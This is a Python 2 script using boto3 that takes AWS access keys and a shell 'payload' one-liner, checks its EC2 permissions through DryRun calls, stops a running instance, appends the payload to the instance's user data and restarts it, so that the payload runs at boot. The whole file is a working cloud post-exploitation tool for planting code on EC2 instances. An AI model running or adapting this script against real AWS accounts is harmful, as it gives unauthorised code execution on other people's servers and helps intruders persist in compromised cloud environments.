import boto3
import sys
import botocore
import base64
import argparse


def describe_instance():
	
	#check that we have permissions
	try:

		response = client.describe_instances(DryRun=True)
	except botocore.exceptions.ClientError as e:
		if e.response['Error']['Message'] == "Request would have succeeded, but DryRun flag is set.":
			print "[*] We have permission to describe instances."
		else:
			print "[x] We do not have permission to describe instances. Shutting down..."
			sys.exit()
	if client.describe_instances()['Reservations'][0]['Instances'][0]['State']['Name'] != "running":

		instanceid = client.describe_instances()['Reservations'][1]['Instances'][0]['InstanceId']
	else:
		instanceid = client.describe_instances()['Reservations'][0]['Instances'][0]['InstanceId']
	return instanceid

def get_userdata():

	try:

		response = client.describe_instance_attribute(DryRun=True, Attribute="userData", InstanceId=instanceid)

	except botocore.exceptions.ClientError as e:
		if e.response['Error']['Message'] == "Request would have succeeded, but DryRun flag is set.":
			print "[*] We have permission to describe instance attributes."


	userdata = base64.b64decode(client.describe_instance_attribute(Attribute="userData", InstanceId=instanceid)['UserData']['Value'])
	
	return userdata

def modify_userdata(userdata, payload):

	new_userdata = userdata + "\n" + payload

	try:
		response = client.modify_instance_attribute(DryRun=True, InstanceId=instanceid, UserData={"Value": new_userdata})

	except botocore.exceptions.ClientError as e:
		if e.response['Error']['Message'] == "Request would have succeeded, but DryRun flag is set.":
			print "[*] We have permission to modify instance attributes."

	try:
		response = client.stop_instances(InstanceIds=[instanceid,], DryRun=True)

	except botocore.exceptions.ClientError as e:
		if e.response['Error']['Message'] == "Request would have succeeded, but DryRun flag is set.":
			print "[*] We have permission to stop instances."

	try:
		response = client.start_instances(InstanceIds=[instanceid,], DryRun=True)

	except botocore.exceptions.ClientError as e:
		if e.response['Error']['Message'] == "Request would have succeeded, but DryRun flag is set.":
			print "[*] We have permission to start instances."

	print "[!] Stopping instance now."

	response = client.stop_instances(InstanceIds=[instanceid,])

	print "[*] Waiting for the server to stop..."

	while client.describe_instances(InstanceIds=[instanceid,])['Reservations'][0]['Instances'][0]['State']['Name'] != "stopped":
		pass

	response = client.modify_instance_attribute(InstanceId=instanceid, UserData={"Value": new_userdata})
	print "[*] User data now modified."

def start_instance():
	print "[!] Starting instance."
	response = client.start_instances(InstanceIds=[instanceid,])
	while client.describe_instances(InstanceIds=[instanceid,])['Reservations'][0]['Instances'][0]['State']['Name'] != "running":
		pass
	response = client.describe_instances(InstanceIds=[instanceid,])
	ip = response['Reservations'][0]['Instances'][0]['PublicIpAddress']

	print "Instance now started and live on IP Address: " + ip
#############################################calls to the above functions start below#################################################################################
parser = argparse.ArgumentParser()
parser.add_argument("key_id", help="AWS Access Key ID")
parser.add_argument("secret", help="AWS Secret Access Key")
parser.add_argument("payload", help="One-liner that can be added to a shell script")
args = parser.parse_args()

client = boto3.client(
	'ec2',
	aws_access_key_id=args.key_id,
	aws_secret_access_key=args.secret
	)

instanceid = describe_instance()
userdata = get_userdata()


payload = args.payload

modify_userdata(userdata, payload)
start_instance()

